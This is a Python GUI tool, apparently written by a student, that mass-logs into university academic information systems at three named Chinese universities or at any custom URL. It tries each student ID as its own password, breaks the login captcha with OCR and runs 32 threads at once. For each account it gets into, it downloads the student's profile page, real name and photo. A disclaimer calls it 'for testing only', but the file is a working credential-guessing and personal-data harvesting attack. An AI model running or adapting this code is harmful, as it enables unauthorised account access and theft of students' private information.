# -*- coding:utf-8 -*-
# by 'hollowman6' from Lanzhou University(兰州大学)

'''
警告：
仅供测试使用，不可用于任何非法用途！
对于使用本代码所造成的一切不良后果，本人将不负任何责任！

Warning:
For TESTING ONLY, not for any ILLIGAL USE!
I will not be responsible for any adverse consequences caused by using this code.

'''

# 多线程 Multithreading
import threading
# 图像处理 Image processing
from PIL import Image
from PIL import ImageTk
# 文件处理 File processing
import io
# 正则表达式搜索 Regular expression search
import re
# 使能够在命令行下输入密码 Enable Entering a password at the command line
import getpass
# 爬虫库导入 Import Spider
import requests
# 识别验证码 Captcha Verification
import pytesseract
# 图形界面
import tkinter as tk
import tkinter.messagebox

# 使用多线程 Using multithreading
# 限制线程的最大数量为32个 The maximum number of restricted threads is 32
threadmax = threading.BoundedSemaphore(32)
# 将锁内的代码串行化 Serialization of code in locks
lock = threading.Lock()
l = []
flag = False


# 按照阈值进行二值化处理 Binarization according to threshold
# threshold: 像素阈值
def get_bin_table(threshold):
    # 获取灰度转二值的映射table Mapping table for gray level to binary
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    return table


# 去掉二值化处理后的图片中的边缘噪声 Remove edge noise from binarized images
def cut_noise(image):

    rows, cols = image.size  # 图片的宽度和高度 Width and Height of Pictures
    position = []  # 噪声位置 Noise location

    # 遍历图片中的每个点，除掉边缘 Traverse through each point in the picture, removing the edges
    for i in range(68, rows):
        for j in range(0, cols):
            position.append((i, j))
    # 对相应位置进行像素修改，将噪声处的像素置为1（白色） Modify the corresponding position and set the noise pixel to 1 (white)
    for pos in position:
        image.putpixel(pos, 1)

    return image  # 返回修改后的图片 Return the modified image


# 识别图片中的数字 Recognition of Numbers in Pictures
# 传入参数为图片路径，返回结果为：识别结果 The input parameter is the picture path, and the return result is: recognition result
def OCR_lmj(img_path):

    image = Image.open(img_path)  # 打开图片文件 Open Picture File
    imgry = image.convert('L')  # 转化为灰度图 Conversion to gray scale image

    # 将图片进行二值化处理 Binarization of Pictures
    table = get_bin_table(140)
    out = imgry.point(table, '1')

    # 去掉图片中的噪声（孤立点） Remove noise (outliers) from the picture
    out = cut_noise(out)

    # 识别图片 Identifying pictures
    text = pytesseract.image_to_string(out)

    # 去掉识别结果中的特殊字符 Remove special characters from recognition results
    exclude_char_list = ''' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW€XYZ§。，；：£©®é¢™“”’‘￥~·.:\|'"?![],()~@#$%^&*_+-={};/¥'''
    text = ''.join([x for x in text if x not in exclude_char_list])
    return text


class qdujw:
    def __init__(self):
        # 伪装爬虫 Camouflage Spider
        self.userid = 0
        self.s = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36'
        }

    # 教务系统登录 Login STU-INFO System
    def login(self, sid, passwd, url):
        global lb, T
        # 页面相关设置 Page Related Settings
        loginurl = url+'/academic/j_acegi_security_check'
        codeurl = url+'/academic/getCaptcha.do'
        userurl = url+'/academic/student/studentinfo/studentInfoModifyIndex.do?frombase=0&wantTag=0&groupId=&moduleId=2060'
        try:
            # 验证码 Captcha
            code = self.s.get(codeurl, headers=self.headers, stream=True)
            codetext = OCR_lmj(io.BytesIO(code.content))

            # 验证码识别长度符合要求 The length of captcha recognized is fitted
            if len(codetext) >= 4 and len(codetext) <= 6:

                # 登录 Login
                postdata = {
                    'j_username': sid,
                    'j_password': passwd,
                    'j_captcha': codetext
                }
                r = self.s.post(loginurl, postdata)

                # 验证码错误 Wrong Captcha
                if re.search(u'\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e', r.text):
                    qdujw().login(sid, passwd, url)

                # 验证码匹配成功 Captcha matched
                else:
                    userpage = self.s.get(userurl).content
                    gbcontent = str(userpage.decode('gb2312', 'ignore'))
                    if "权限不够,访问被拒绝" in gbcontent:  # Refuse to access
                        T.insert(tk.END, sid+"失败！\n")  # Fail
                        # 释放信号量，可用信号量加一 Release semaphores, add one semaphore
                        threadmax.release()

                    else:
                        imageid = ''.join(re.findall(
                            r'"/academic/manager/studentinfo/showStudentImage.jsp?id=(.+?)"', gbcontent))
                        imagepage = url+"/academic/manager/studentinfo/showStudentImage.jsp?id="+imageid
                        name = ''.join(re.findall(r'name="realname" value="(.+?)"',
                                                  str(userpage.decode('utf-8', 'ignore'))))
                        image = self.s.get(imagepage).content
                        # 写入文件 Write file
                        wf = open("data/"+name +
                                  sid.replace("\n", '')+'.html', 'wb')
                        wf.write(userpage)
                        wf.close()
                        wi = open("data/"+name +
                                  sid.replace("\n", '')+'.jpg', 'wb')
                        wi.write(image)
                        lb.insert(tk.END, name + " " + sid.replace("\n", ''))
                        # Success, saved locally
                        T.insert(tk.END, sid+"成功！已保存到本地！\n")
                        wi.close()
                        # 上锁，第一个线程如果申请到锁，会在执行公共数据的过程中持续阻塞后续线程
                        # 即后续第二个或其他线程依次来了发现已经被上锁，只能等待第一个线程释放锁
                        # 当第一个线程将锁释放，后续的线程会进行争抢
                        # Lock. If the first thread applies for a lock, it will continue to block subsequent threads while executing public data.
                        # That is, the next second or other thread comes in turn and finds that it has been locked and can only wait for the first thread to release the lock.
                        # When the first thread releases the lock, subsequent threads compete.
                        lock.acquire()
                        fw = open("success.txt", 'a')
                        fw.write(sid)
                        fw.close()
                        # 释放锁 Release lock
                        lock.release()
                        # 释放信号量，可用信号量加一 Release semaphores, add one semaphore
                        threadmax.release()

            else:
                qdujw().login(sid, passwd, url)
        except Exception:
            threadmax.release()
            pass


dlist = []
# 打开数据文件 Open data files
f = open("list.txt")
line = f.readline()
while line:
    dlist.append(line)
    line = f.readline()
f.close()


# 定义爬虫线程 Define Spider Thread
def main():
    global url
    for line in dlist:
        # 增加信号量，可用信号量减一 Increase the semaphore and subtract one from the semaphore
        threadmax.acquire()
        t = threading.Thread(target=qdujw().login, args=(line, line, url))
        t.start()
        l.append(t)
    for t in l:
        t.join()


# 开始爬虫 Start Spidering
def run():
    global url, root, flag, e
    if v.get() == 4:
        url = e.get()
    if url == "":
        tkinter.messagebox .showerror('错误', '请选择或自定义要爬取的网站！', parent=root)
    elif flag == True:
        tkinter.messagebox .showwarning(
            '警告', '已经在爬取中，请耐心等待！退出请点击“退出按钮”。\n如果已经爬取完成，请重新打开程序来继续另外网站的爬取。', parent=root)
    else:
        flag = True
        t = threading.Thread(target=main)
        t.setDaemon(True)
        t.start()


# Tkinter 界面设定 UI Setting
root = tk.Tk()
root.title('Spider for Student Information System -- By Hollow Man')
root.geometry('500x500')
v = tk.IntVar()
e = tk.Entry(root)
url = ""


def r1():
    global url
    url = "http://jwk.lzu.edu.cn"


def r2():
    global url
    url = "http://jw.qdu.edu.cn"


def r3():
    global url
    url = "http://jw.cuc.edu.cn"


def r4():
    global url, e
    url = e.get()


tk.Label(text='设置要爬取的网站：').pack(anchor=tk.W)
tk.Radiobutton(root, text='LZU', variable=v,
               value=1, command=r1).pack(anchor=tk.W)
tk.Radiobutton(root, text='QDU', variable=v,
               value=2, command=r2).pack(anchor=tk.W)
tk.Radiobutton(root, text='CUC', variable=v,
               value=3, command=r3).pack(anchor=tk.W)
tk.Radiobutton(root, text='自定义：', variable=v,
               value=4, command=r4).pack(anchor=tk.W)
v.set(4)
e.pack(anchor=tk.W)
tk.Label(text='爬取到的姓名和账号：').pack(anchor=tk.W)
lbv = tk.StringVar()
lb = tk.Listbox(root, selectmode=tk.SINGLE, listvariable=lbv)
scr = tk.Scrollbar(root)
lb.pack()
tk.Button(root, text="开始", command=run).pack(anchor=tk.CENTER)
tk.Button(root, text="退出", command=root.destroy).pack(anchor=tk.CENTER)
lb.config(yscrollcommand=scr.set)
scr.config(command=lb.yview)
lb.pack(side=tk.LEFT, fill=tk.Y)
scr.pack(side=tk.LEFT, fill=tk.Y)
S = tk.Scrollbar(root)
T = tk.Text(root, height=4, width=50)
S.pack(side=tk.RIGHT, fill=tk.Y)
T.pack(side=tk.RIGHT, fill=tk.Y)
S.config(command=T.yview)
T.config(yscrollcommand=S.set)
quote = """警告：\n仅供测试使用，不可用于任何非法用途！\n对于使用本代码所造成的一切不良后果，本人将不负任何责任！\n\n说明：\n可以自定义爬取站点，也可以选择内置站点爬取。\n已经爬取到的账号双击左键查看照片，双击右键查看爬取的信息网页源代码。\n请事先在软件目录下新建data文件夹和账号数据list.txt文件\n\n爬取信息:\n"""
T.insert(tk.END, quote)


# 绑定事件 Binding events
def ShowPic(self):
    global lb
    top = tk.Toplevel()
    top.title('查看照片')
    im = Image.open("data/"+lb.get(lb.curselection()).replace(" ", '')+".jpg")
    img = ImageTk.PhotoImage(im)
    imLabel = tk.Label(top, image=img)
    imLabel.pack()
    top.mainloop()


def ShowInfo(self):
    global lb
    top = tk.Toplevel()
    top.title('查看信息源代码')
    top.geometry('350x600')
    S1 = tk.Scrollbar(top)
    T1 = tk.Text(top, height=4, width=50)
    S1.pack(side=tk.RIGHT, fill=tk.Y)
    T1.pack(side=tk.RIGHT, fill=tk.Y)
    S1.config(command=T1.yview)
    T1.config(yscrollcommand=S1.set)
    fread = open("data/"+lb.get(lb.curselection()).replace(" ",
                                                           '')+".html", 'r', encoding='UTF-8')
    txt = fread.read()
    fread.close()
    T1.insert(tk.END, txt)
    top.mainloop()


lb.bind("<Double-Button-1>", ShowPic)
lb.bind("<Double-Button-3>", ShowInfo)
root.mainloop()